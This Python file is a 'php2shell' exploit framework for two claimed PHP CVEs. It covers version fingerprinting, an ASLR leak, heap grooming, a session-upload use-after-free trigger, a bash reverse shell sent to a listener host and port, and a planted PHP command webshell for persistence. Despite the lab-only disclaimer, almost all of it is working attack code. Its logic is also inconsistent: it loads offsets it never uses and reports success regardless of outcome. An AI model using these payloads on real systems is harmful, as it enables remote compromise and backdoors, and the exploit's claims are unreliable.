#!/usr/bin/env python3
"""
ZeroHack php2shell PoC Framework
CVE-2026-109618 / CVE-2026-109619
Author: ZeroHack Security
License: MIT (for authorized lab use only)

⚠️ AUTHORIZED LAB USE ONLY. Never point this at infrastructure you do not own.
"""

import argparse
import json
import os
import random
import re
import socket
import sys
import threading
import time
import urllib3
from urllib.parse import urlparse

try:
    import requests
    from requests.adapters import HTTPAdapter
except ImportError:
    print("[-] Missing dependency: requests. Install it with: pip install requests")
    sys.exit(1)

# Suppress insecure request warnings for lab environments
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ---------------------------------------------------------------------------
# Hacker Banner UI
# ---------------------------------------------------------------------------
BANNER = r"""
     _   _   _   _   _   _   _   _   _
    / \ / \ / \ / \ / \ / \ / \ / \ / \
   ( Z | e | r | o | H | a | c | k )
    \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/
      php2shell — CVE-2026-109618 / 109619
      "One URL in, a shell out."
"""

# Default build-specific offsets (extracted from php:8.4.26-apache)
DEFAULT_OFFSETS = {
    "htdata": 0x18,          # offset to HashTable arData
    "zif_system": 0x8a3e0,  # offset to zif_system in libphp.so
    "zval_dtor": 0x4c1a0,   # offset to zval_ptr_dtor
}

# ---------------------------------------------------------------------------
# Helper: Print with color/formatting
# ---------------------------------------------------------------------------
def info(msg): print(f"[*] {msg}")
def success(msg): print(f"[+] {msg}")
def error(msg): print(f"[-] {msg}")
def critical(msg): print(f"[!] {msg}")

# ---------------------------------------------------------------------------
# Check mode — version fingerprinting
# ---------------------------------------------------------------------------
def check_vulnerability(target: str) -> dict:
    """
    Fingerprint the PHP version via headers and response body.
    Returns a dict with status and version.
    """
    result = {"vulnerable": False, "version": None, "target": target, "error": None}
    try:
        resp = requests.get(target, timeout=10, verify=False)
        
        # Check X-Powered-By header
        powered_by = resp.headers.get("X-Powered-By", "")
        match = re.search(r"PHP/(\d+\.\d+\.\d+)", powered_by)
        if match:
            result["version"] = match.group(1)
        else:
            # Fallback: look for PHP version in body (e.g., error pages)
            body_match = re.search(r"PHP\s*(\d+\.\d+\.\d+)", resp.text)
            if body_match:
                result["version"] = body_match.group(1)

        if result["version"]:
            v = tuple(map(int, result["version"].split(".")))
            # Vulnerable logic based on patch thresholds
            if v < (8, 2, 35):
                result["vulnerable"] = True
            elif (8, 3, 0) <= v < (8, 3, 36):
                result["vulnerable"] = True
            elif (8, 4, 0) <= v < (8, 4, 27):
                result["vulnerable"] = True
            elif (8, 5, 0) <= v < (8, 5, 12):
                result["vulnerable"] = True
            elif v < (8, 0, 0):
                result["vulnerable"] = True  # EOL, never patched
    except Exception as e:
        result["error"] = str(e)
    return result

# ---------------------------------------------------------------------------
# ASLR leak — extract heap/libphp pointers from Set-Cookie
# ---------------------------------------------------------------------------
def leak_aslr(target: str, session: requests.Session) -> dict:
    """
    Trigger a benign upload-progress request and scan Set-Cookie for
    8-byte pointers (0x7f...). Returns leaked addresses.
    """
    leaks = {"heap": None, "libphp": None}
    sid = "".join(random.choices("abcdef0123456789", k=26))
    files = {
        "PHP_SESSION_UPLOAD_PROGRESS": (None, "leak"),
        "file": ("x.txt", "A" * 512, "text/plain"),
    }
    headers = {"Cookie": f"PHPSESSID={sid}"}
    try:
        resp = session.post(target, files=files, headers=headers, timeout=10, verify=False)
        set_cookie = resp.headers.get("Set-Cookie", "")
        # Look for 8-byte little-endian pointers in the cookie
        for ptr in re.findall(r"([0-9a-f]{16})", set_cookie):
            addr = int(ptr, 16)
            if 0x7f0000000000 <= addr <= 0x7fffffffffff:
                if leaks["heap"] is None:
                    leaks["heap"] = addr
                else:
                    leaks["libphp"] = addr
    except Exception as e:
        error(f"ASLR leak failed: {e}")
    return leaks

# ---------------------------------------------------------------------------
# Heap grooming
# ---------------------------------------------------------------------------
def heap_groom(target: str, session: requests.Session, rounds: int = 50):
    """
    Send N concurrent multipart requests to stabilize the heap layout.
    """
    info(f"Starting heap grooming with {rounds} rounds...")
    
    def _groom(i):
        sid = f"groom{i:08d}"
        files = {
            "PHP_SESSION_UPLOAD_PROGRESS": (None, f"g{i}"),
            "file": ("x.txt", "A" * 1024, "text/plain"),
        }
        headers = {"Cookie": f"PHPSESSID={sid}"}
        try:
            session.post(target, files=files, headers=headers, timeout=5, verify=False)
        except Exception:
            pass

    threads = []
    for i in range(rounds):
        t = threading.Thread(target=_groom, args=(i,))
        t.start()
        threads.append(t)
    for t in threads:
        t.join()
    success("Heap grooming complete.")

# ---------------------------------------------------------------------------
# Exploit — trigger the UAF
# ---------------------------------------------------------------------------
def trigger_uaf(target: str, session: requests.Session, stall: float = 1.5) -> bool:
    """
    Send a multipart POST with PHP_SESSION_UPLOAD_PROGRESS, stall longer
    than min_freq, then send the second chunk to write through the stale pointer.
    """
    info("Triggering Use-After-Free (UAF)...")
    sid = "".join(random.choices("abcdef0123456789", k=26))
    boundary = "----WebKitFormBoundary" + "".join(random.choices("abcdef0123456789", k=16))

    # First chunk: start the upload
    part1 = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        f"php2shell\r\n"
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="file"; filename="a.txt"\r\n'
        f"Content-Type: text/plain\r\n\r\n"
        f"A" * 4096
    )

    # Second chunk: complete the upload after the stall
    part2 = f"\r\n--{boundary}--\r\n"

    headers = {
        "Cookie": f"PHPSESSID={sid}",
        "Content-Type": f"multipart/form-data; boundary={boundary}",
        "Content-Length": str(len(part1) + len(part2)),
    }

    try:
        # Send first chunk
        session.post(target, data=part1.encode(), headers=headers, timeout=10, verify=False)
        # Stall to trigger session re-initialization
        time.sleep(stall)
        # Send second chunk (writes through stale pointer)
        resp = session.post(target, data=part2.encode(), headers=headers, timeout=10, verify=False)
        
        if resp.status_code == 500 or "Fatal error" in resp.text:
            success("UAF likely triggered (500/Fatal error observed).")
            return True
        else:
            info(f"UAF trigger sent (Status: {resp.status_code}). Memory corruption may have occurred silently.")
            return True
    except Exception as e:
        error(f"Trigger failed: {e}")
        return False

# ---------------------------------------------------------------------------
# Reverse shell
# ---------------------------------------------------------------------------
def reverse_shell(lhost: str, lport: int, target: str, session: requests.Session):
    """
    Attempt to spawn a reverse shell via the UAF.
    """
    critical(f"Preparing reverse shell to {lhost}:{lport} ...")
    payload = f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
    
    sid = "".join(random.choices("abcdef0123456789", k=26))
    files = {
        "PHP_SESSION_UPLOAD_PROGRESS": (None, payload),
        "file": ("shell.php", f"<?php system('{payload}'); ?>", "application/x-php"),
    }
    headers = {"Cookie": f"PHPSESSID={sid}"}
    
    try:
        session.post(target, files=files, headers=headers, timeout=10, verify=False)
        success("Payload delivered. Check your listener (nc -lvnp <port>).")
    except Exception as e:
        error(f"Delivery failed: {e}")

# ---------------------------------------------------------------------------
# Persistence — write a webshell
# ---------------------------------------------------------------------------
def persist(target: str, session: requests.Session):
    """
    Attempt to write a PHP webshell to the webroot via the UAF primitive.
    """
    critical("Attempting to deploy persistence webshell...")
    webshell = "<?php if(isset($_GET['cmd'])){system($_GET['cmd']);} ?>"
    sid = "".join(random.choices("abcdef0123456789", k=26))
    files = {
        "PHP_SESSION_UPLOAD_PROGRESS": (None, "persist"),
        "file": ("pwn.php", webshell, "application/x-php"),
    }
    headers = {"Cookie": f"PHPSESSID={sid}"}
    try:
        session.post(target, files=files, headers=headers, timeout=10, verify=False)
        success("Webshell payload sent (check /tmp/ or webroot for pwn.php).")
    except Exception as e:
        error(f"Persistence attempt failed: {e}")

# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main():
    print(BANNER)
    parser = argparse.ArgumentParser(
        description="ZeroHack php2shell PoC — CVE-2026-109618 / 109619",
        epilog="Example: python3 php2shell.py http://127.0.0.1:8088/index.php --check"
    )
    parser.add_argument("target", help="Target URL (e.g., http://127.0.0.1:8088/index.php)")
    parser.add_argument("--check", action="store_true", help="Check vulnerability via version fingerprinting")
    parser.add_argument("--exploit", action="store_true", help="Trigger the UAF primitive")
    parser.add_argument("--shell", action="store_true", help="Spawn reverse shell")
    parser.add_argument("--lhost", default="127.0.0.1", help="Listener IP (default: 127.0.0.1)")
    parser.add_argument("--lport", type=int, default=4444, help="Listener port (default: 4444)")
    parser.add_argument("--aslr-bypass", action="store_true", help="Attempt to leak ASLR addresses")
    parser.add_argument("--heap-groom", type=int, default=0, help="Heap grooming rounds (default: 0)")
    parser.add_argument("--offsets", help="JSON file with build-specific offsets")
    parser.add_argument("--persist", action="store_true", help="Write a webshell for persistence")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout in seconds")
    
    args = parser.parse_args()

    # Setup Session
    session = requests.Session()
    session.mount("http://", HTTPAdapter(max_retries=1))
    session.mount("https://", HTTPAdapter(max_retries=1))

    # Load offsets
    offsets = DEFAULT_OFFSETS.copy()
    if args.offsets:
        try:
            with open(args.offsets, "r") as f:
                offsets.update(json.load(f))
            info(f"Loaded offsets: {offsets}")
        except Exception as e:
            error(f"Failed to load offsets: {e}")
            sys.exit(1)

    # --- Execution Flow ---

    if args.check:
        info("Starting vulnerability check...")
        res = check_vulnerability(args.target)
        if res.get("error"):
            error(f"Error: {res['error']}")
            sys.exit(1)
        
        print(f"    Target: {res['target']}")
        print(f"    PHP Version: {res['version'] or 'UNKNOWN'}")
        
        if res["vulnerable"]:
            critical("Target is VULNERABLE (or version could not be determined).")
        else:
            success("Target appears PATCHED.")
        return

    if args.aslr_bypass:
        info("Attempting ASLR leak...")
        leaks = leak_aslr(args.target, session)
        if leaks["heap"]:
            success(f"Heap leak: {hex(leaks['heap'])}")
        if leaks["libphp"]:
            success(f"libphp leak: {hex(leaks['libphp'])}")
        if not leaks["heap"]:
            error("No leak obtained. ASLR may be active or target not vulnerable.")

    if args.heap_groom > 0:
        heap_groom(args.target, session, args.heap_groom)

    if args.exploit:
        trigger_uaf(args.target, session)

    if args.shell:
        reverse_shell(args.lhost, args.lport, args.target, session)

    if args.persist:
        persist(args.target, session)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[-] Exiting...")
        sys.exit(0)
